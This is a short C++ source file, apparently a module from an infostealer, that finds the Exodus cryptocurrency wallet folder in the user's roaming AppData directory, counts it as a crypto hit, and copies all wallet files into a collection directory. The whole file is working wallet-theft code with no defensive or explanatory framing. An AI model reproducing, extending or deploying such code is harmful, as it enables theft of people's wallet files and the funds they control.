//
// Created by TERETERY on 07.06.2024.
//

#include "Exodus.h"

static const fs::path EXODUS_PATH = Utils::getRoamingPath() / "Exodus" / "exodus.wallet";

void Exodus::execute(fs::path &root) {
    std::vector<fs::path> paths = FilesUtil::scanDirectory(EXODUS_PATH);

    if(paths.empty())
        return;

    Counter::increaseCrypto();
    fs::path dst = root / "Exodus";
    fs::create_directories(dst);

    for(fs::path &path : paths)
    {
        Utils::copy(path, dst);
    }
}